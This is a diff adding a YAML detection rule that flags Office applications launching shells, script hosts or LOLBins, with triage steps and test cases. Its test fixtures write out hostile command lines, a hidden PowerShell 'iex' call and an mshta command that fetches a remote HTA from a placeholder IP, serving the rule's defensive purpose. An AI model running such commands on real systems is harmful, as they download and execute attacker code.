@@ -1,0 +1,37 @@
+id: DL-0003
+title: Office application starts a shell or script host
+description: >
+  Word, Excel, PowerPoint, Outlook or another Office app starts cmd, PowerShell, a script
+  host or a LOLBin. This is what a malicious macro or an exploited document looks like on
+  the endpoint. Office almost never needs to do this on its own.
+attack: [T1204.002, T1566.001]
+tactic: execution
+severity: high
+logsource: process_creation
+detection:
+  selection:
+    parent.name: [winword.exe, excel.exe, powerpnt.exe, outlook.exe, msaccess.exe, mspub.exe, onenote.exe, visio.exe]
+    process.name: [cmd.exe, powershell.exe, pwsh.exe, wscript.exe, cscript.exe, mshta.exe, rundll32.exe,
+                   regsvr32.exe, certutil.exe, bitsadmin.exe, schtasks.exe, msbuild.exe, wmic.exe]
+  condition: selection
+false_positives:
+  - Business macros that call cmd or PowerShell on purpose. Build an allowlist by document path and signer.
+triage:
+  - Identify the document the Office process had open and where it came from (mail attachment, download, share).
+  - Read the child command line and follow any download or new process it started.
+  - Search for the same document hash or sender across other mailboxes and endpoints.
+tests:
+  match:
+    - parent.name: WINWORD.EXE
+      process.name: powershell.exe
+      process.command_line: 'powershell -w hidden -c iex(...)'
+    - parent.name: excel.exe
+      process.name: mshta.exe
+      process.command_line: 'mshta http://203.0.113.9/x.hta'
+  no_match:
+    - parent.name: winword.exe
+      process.name: splwow64.exe
+      process.command_line: 'splwow64.exe 8192'
+    - parent.name: explorer.exe
+      process.name: powershell.exe
+      process.command_line: 'powershell'
